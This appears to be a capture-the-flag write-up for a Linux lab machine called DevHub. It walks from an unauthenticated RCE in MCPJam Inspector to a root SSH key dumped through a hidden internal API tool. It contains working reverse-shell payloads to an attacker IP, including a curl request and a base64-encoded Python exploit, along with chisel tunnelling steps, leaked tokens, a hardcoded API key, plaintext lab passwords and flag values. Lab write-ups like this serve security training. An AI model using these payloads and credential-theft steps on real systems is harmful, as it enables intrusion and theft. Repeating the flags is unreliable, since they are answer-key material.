@@ -1,0 +1,340 @@
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                           DEVHUB - HTB WRITE-UP                            ║
+║                        Difficulty: Medium | OS: Linux                       ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+
+Flags:
+  User Flag: c111e00f69986e4b13226557001224d7
+  Root Flag: 43bda50d21bb9fa4c090d959fa9f6db1
+
+════════════════════════════════════════════════════════════════════════════════
+
+1. RECONNAISSANCE
+────────────────────────────────────────────────────────────────────────────────
+
+1.1 Nmap Scan:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ nmap -sC -sV devhub.htb                                                    │
+│                                                                             │
+│ Results:                                                                    │
+│   Port 22   (SSH)   - Open                                                 │
+│   Port 80   (HTTP)  - Landing page                                         │
+│   Port 6274 (HTTP)  - MCPJam Inspector v1.4.2 (VULNERABLE)                │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+1.2 Hosts File Configuration:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ echo "10.129.112.66 devhub.htb" >> /etc/hosts                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+1.3 Web Enumeration:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ http://devhub.htb/     → Landing page (no attack surface)                  │
+│ http://devhub.htb:6274/ → MCPJam Inspector v1.4.2 (VULNERABLE)            │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+════════════════════════════════════════════════════════════════════════════════
+
+2. INITIAL ACCESS - CVE-2026-23744
+────────────────────────────────────────────────────────────────────────────────
+
+2.1 Vulnerability Details:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ CVE-2026-23744: Unauthenticated RCE in MCPJam Inspector <= 1.4.2          │
+│                                                                             │
+│ Root Cause: /api/mcp/connect passes attacker-controlled JSON directly     │
+│             to child_process.spawn with no authentication.                 │
+│ CVSS: 9.8 CRITICAL                                                         │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+2.2 Listener Setup:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ nc -lvnp 4444                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+2.3 Exploit Payload:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ curl -X POST http://devhub.htb:6274/api/mcp/connect \                     │
+│   -H "Content-Type: application/json" \                                   │
+│   -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >&          │
+│        /dev/tcp/10.10.16.6/4444 0>&1"],"env":{}},"serverId":"mytest"}'    │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+2.4 Exploit Script (exploit.py):
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ #!/usr/bin/env python3                                                     │
+│ """CVE-2026-23744 - MCPJam Inspector Unauthenticated RCE"""               │
+│                                                                             │
+│ import requests, base64, argparse, sys                                     │
+│                                                                             │
+│ def build_payload(lhost, lport):                                           │
+│     shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"               │
+│     encoded = base64.b64encode(shell_cmd.encode()).decode()               │
+│     return {                                                               │
+│         "serverConfig": {                                                  │
+│             "command": "bash",                                             │
+│             "args": ["-c", f"echo {encoded} | base64 -d | bash"],         │
+│             "env": {}                                                      │
+│         },                                                                 │
+│         "serverId": "exploit"                                              │
+│     }                                                                      │
+│                                                                             │
+│ def main():                                                                │
+│     # Usage: python3 exploit.py -t devhub.htb -l 10.10.16.6 -r 4444       │
+│     # ... (full exploit code)                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+2.4 Result:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ ✅ Shell as mcp-dev                                                        │
+│ mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$                 │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+════════════════════════════════════════════════════════════════════════════════
+
+3. PRIVILEGE ESCALATION - JUPYTER TOKEN DISCLOSURE
+────────────────────────────────────────────────────────────────────────────────
+
+3.1 Enumerating Jupyter Process:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ ps aux | grep jupyter                                                      │
+│                                                                             │
+│ analyst 1047 /home/analyst/jupyter-env/bin/python3 ...                     │
+│   --ip=127.0.0.1 --port=8888 --no-browser                                  │
+│   --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7              │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+3.2 Jupyter Token:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7                                 │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+3.3 Chisel Tunneling - Setup (Kali):
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ # Download chisel                                                          │
+│ wget https://github.com/jpillora/chisel/releases/download/v1.10.1/        │
+│      chisel_1.10.1_linux_amd64.gz                                          │
+│ gunzip chisel_1.10.1_linux_amd64.gz                                       │
+│ mv chisel_1.10.1_linux_amd64 chisel                                       │
+│ chmod +x chisel                                                            │
+│                                                                             │
+│ # Start chisel server                                                      │
+│ ./chisel server --reverse --port 9001                                     │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+3.4 Chisel Tunneling - Target:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ # On target (mcp-dev shell)                                                │
+│ cd /tmp                                                                    │
+│ wget http://10.10.16.6:8001/chisel                                        │
+│ chmod +x chisel                                                            │
+│ ./chisel client 10.10.16.6:9001 R:8888:127.0.0.1:8888 &                  │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+3.5 Access Jupyter (Browser):
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ http://localhost:8888/?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7     │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+════════════════════════════════════════════════════════════════════════════════
+
+4. GETTING ROOT SSH KEY - OPSMCP API
+────────────────────────────────────────────────────────────────────────────────
+
+4.1 Reading server.py in Jupyter:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ # In Jupyter Python notebook                                               │
+│ with open('/opt/opsmcp/server.py', 'r') as f:                             │
+│     print(f.read())                                                        │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+4.2 API Key Found:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"                      │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+4.3 Hidden Tools Identified:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ HIDDEN_TOOLS = {                                                           │
+│     "ops._admin_dump": {                                                   │
+│         "description": "Emergency credential dump - INTERNAL ONLY",       │
+│         "parameters": {"target": "string", "confirm": "boolean"}          │
+│     }                                                                      │
+│ }                                                                          │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+4.4 Extract Root SSH Key:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ import requests, json                                                      │
+│                                                                             │
+│ url = "http://127.0.0.1:5000/tools/call"                                  │
+│ headers = {                                                                │
+│     "X-API-Key": "opsmcp_secret_key_4f5a6b7c8d9e0f1a",                    │
+│     "Content-Type": "application/json"                                     │
+│ }                                                                          │
+│ payload = {                                                                │
+│     "name": "ops._admin_dump",                                             │
+│     "arguments": {"target": "ssh_keys", "confirm": True}                  │
+│ }                                                                          │
+│                                                                             │
+│ response = requests.post(url, headers=headers, json=payload)              │
+│ print(json.dumps(response.json(), indent=2))                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+4.5 Response:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ {                                                                           │
+│   "target": "ssh_keys",                                                    │
+│   "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n              │
+│   b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\n  │
+│   ... (full key) ...",                                                     │
+│   "note": "Emergency recovery key dump"                                    │
+│ }                                                                          │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+════════════════════════════════════════════════════════════════════════════════
+
+5. ROOT ACCESS
+────────────────────────────────────────────────────────────────────────────────
+
+5.1 Save SSH Key:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ nano root_key                                                              │
+│ # Paste the private key                                                    │
+│ chmod 600 root_key                                                         │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+5.2 SSH as Root:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ ssh -i root_key root@devhub.htb                                           │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+5.3 Result:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Welcome to Ubuntu 22.04.5 LTS                                              │
+│ root@devhub:~#                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+════════════════════════════════════════════════════════════════════════════════
+
+6. FLAGS
+────────────────────────────────────────────────────────────────────────────────
+
+6.1 Root Flag:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ root@devhub:~# cat /root/root.txt                                         │
+│ 43bda50d21bb9fa4c090d959fa9f6db1                                           │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+6.2 User Flag:
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ root@devhub:~# cat /home/analyst/user.txt                                 │
+│ c111e00f69986e4b13226557001224d7                                           │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+════════════════════════════════════════════════════════════════════════════════
+
+7. ATTACK CHAIN SUMMARY
+────────────────────────────────────────────────────────────────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                     CVE-2026-23744 EXPLOIT                                 │
+│          Unauthenticated POST → /api/mcp/connect                           │
+└─────────────────────────┬───────────────────────────────────────────────────┘
+                          ↓
+                  Shell as mcp-dev
+                          ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│            JUPYTER TOKEN DISCOVERY                                        │
+│          ps aux | grep jupyter                                            │
+│          Token: a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7                  │
+└─────────────────────────┬───────────────────────────────────────────────────┘
+                          ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│              CHISEL PORT FORWARDING                                        │
+│          ./chisel client R:8888:127.0.0.1:8888                            │
+└─────────────────────────┬───────────────────────────────────────────────────┘
+                          ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│              JUPYTER ACCESS                                                │
+│          http://localhost:8888/?token=...                                  │
+└─────────────────────────┬───────────────────────────────────────────────────┘
+                          ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│              READ /opt/opsmcp/server.py                                    │
+│          Found API Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a                │
+└─────────────────────────┬───────────────────────────────────────────────────┘
+                          ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│              CALL ops._admin_dump                                          │
+│          POST /tools/call                                                  │
+│          Body: {"name":"ops._admin_dump","arguments":                     │
+│                 {"target":"ssh_keys","confirm":true}}                      │
+└─────────────────────────┬───────────────────────────────────────────────────┘
+                          ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│              ROOT SSH KEY EXTRACTED                                        │
+│          ssh -i root_key root@devhub.htb                                  │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+════════════════════════════════════════════════════════════════════════════════
+
+8. TOOLS & FILES SUMMARY
+────────────────────────────────────────────────────────────────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ exploit.py      - CVE-2026-23744 RCE exploit                              │
+│ devhub_enum.py  - Local enumeration script                                │
+│ chisel          - Tunneling tool for port forwarding                      │
+│ root_key        - Root SSH private key                                    │
+│                                                                             │
+│ Key Endpoints:                                                             │
+│   http://devhub.htb:6274/api/mcp/connect  - RCE endpoint                  │
+│   http://localhost:8888/                  - Jupyter Notebook              │
+│   http://127.0.0.1:5000/tools/call       - OPSMCP API                    │
+│   http://127.0.0.1:5000/tools/list       - Tool listing (requires auth)   │
+│                                                                             │
+│ Credentials Found:                                                         │
+│   Jupyter Token: a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7                 │
+│   OPSMCP API Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a                     │
+│                                                                             │
+│ Passwords in server.py (for reference):                                    │
+│   root: $6$rounds=656000$saltsalt$hashedpassword                          │
+│   analyst: JupyterN0tebook!2026                                            │
+│   mcp-dev: Mcp!Insp3ct0r2026                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+════════════════════════════════════════════════════════════════════════════════
+
+9. KEY TAKEAWAYS
+────────────────────────────────────────────────────────────────────────────────
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ 1. Always check for service versions and known CVEs                       │
+│    → MCPJam Inspector v1.4.2 had CVE-2026-23744                          │
+│                                                                             │
+│ 2. Jupyter tokens are often exposed in process lists                      │
+│    → ps aux | grep jupyter reveals the token                             │
+│                                                                             │
+│ 3. Internal APIs often have hidden admin endpoints                        │
+│    → /tools/list only shows visible tools                                │
+│    → Hidden tools like ops._admin_dump exist but aren't listed           │
+│                                                                             │
+│ 4. Port forwarding is essential for accessing internal services           │
+│    → Chisel made Jupyter accessible from local machine                    │
+│                                                                             │
+│ 5. Always check source code for hardcoded credentials                     │
+│    → API key was hardcoded in server.py                                  │
+│                                                                             │
+│ 6. Root SSH keys are often recoverable from internal APIs                 │
+│    → ops._admin_dump dumped the root private key                         │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+════════════════════════════════════════════════════════════════════════════════
+
+                MACHINE COMPLETE! 🎉
+                Flags:
+                User: c111e00f69986e4b13226557001224**
+                Root: 43bda50d21bb9fa4c090d959fa9f6d**
+
+════════════════════════════════════════════════════════════════════════════════
